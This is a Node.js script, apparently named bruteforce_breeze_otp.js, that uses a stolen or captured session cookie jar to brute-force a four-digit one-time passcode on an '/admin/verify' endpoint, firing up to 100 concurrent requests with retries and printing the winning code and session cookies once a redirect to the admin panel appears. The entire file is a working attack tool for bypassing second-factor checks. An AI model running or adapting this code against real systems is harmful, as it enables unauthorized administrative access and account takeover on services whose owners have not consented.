const https = require('https');
const fs = require('fs');

const base = process.argv[2];
const cookiePath = process.argv[3];
const concurrency = Number(process.argv[4] || 100);
const start = Number(process.argv[5] || 0);
const end = Number(process.argv[6] || 9999);
const maxRetries = Number(process.argv[7] || 3);

if (!base || !cookiePath) {
  console.error('usage: node scripts/bruteforce_breeze_otp.js <base-url> <cookie-jar> [concurrency]');
  process.exit(2);
}

const jar = fs.readFileSync(cookiePath, 'utf8');
const cookie = jar
  .split('\n')
  .filter((line) => line && (!line.startsWith('#') || line.startsWith('#HttpOnly_')))
  .map((line) => line.replace(/^#HttpOnly_/, ''))
  .map((line) => line.split('\t'))
  .filter((parts) => parts.length >= 7)
  .map((parts) => `${parts[5]}=${parts[6]}`)
  .join('; ');

if (!cookie) {
  console.error('No cookies found in jar');
  process.exit(2);
}

const agent = new https.Agent({ keepAlive: true, maxSockets: concurrency });
const queue = [];
for (let i = start; i <= end; i++) queue.push(String(i).padStart(4, '0'));
let cursor = 0;
let found = false;
let inFlight = 0;
let attempts = 0;
let completed = 0;
let errors = 0;

function requestOtp(code) {
  return new Promise((resolve, reject) => {
    const body = `otp=${code}`;
    const req = https.request(`${base}/admin/verify`, {
      method: 'POST',
      agent,
      headers: {
        Cookie: cookie,
        'Content-Type': 'application/x-www-form-urlencoded',
        'Content-Length': Buffer.byteLength(body),
      },
    }, (res) => {
      res.resume();
      res.on('end', () => resolve({
        code,
        statusCode: res.statusCode,
        location: res.headers.location || '',
        setCookie: res.headers['set-cookie'] || [],
      }));
    });
    req.setTimeout(8000, () => req.destroy(new Error('request timeout')));
    req.on('error', reject);
    req.end(body);
  });
}

async function requestOtpWithRetry(code) {
  let lastError = null;
  for (let tryNo = 0; tryNo <= maxRetries; tryNo++) {
    try {
      return await requestOtp(code);
    } catch (err) {
      lastError = err;
      errors++;
      if (tryNo === maxRetries) {
        return { code, statusCode: 0, location: '', error: lastError.message };
      }
    }
  }
}

function launch() {
  while (!found && inFlight < concurrency && cursor < queue.length) {
    const code = queue[cursor++];
    inFlight++;
    requestOtpWithRetry(code)
      .then((res) => {
        attempts++;
        completed++;
        if (res.statusCode >= 300 && res.statusCode < 400 && res.location.includes('/admin/panel')) {
          found = true;
          console.log(JSON.stringify({ found: res.code, attempts, completed, errors, statusCode: res.statusCode, location: res.location, setCookie: res.setCookie }, null, 2));
          process.exit(0);
        }
        if (attempts % 250 === 0) {
          console.error(`attempts=${attempts} completed=${completed}/${queue.length} errors=${errors} last=${res.code} status=${res.statusCode}${res.error ? ` error=${res.error}` : ''}`);
        }
      })
      .catch((err) => console.error(`unexpected error on ${code}: ${err.message}`))
      .finally(() => {
        inFlight--;
        if (!found && cursor >= queue.length && inFlight === 0) {
          console.error(`No OTP found after ${attempts} attempts; completed=${completed}/${queue.length}; errors=${errors}`);
          process.exit(1);
        }
        launch();
      });
  }
}

launch();
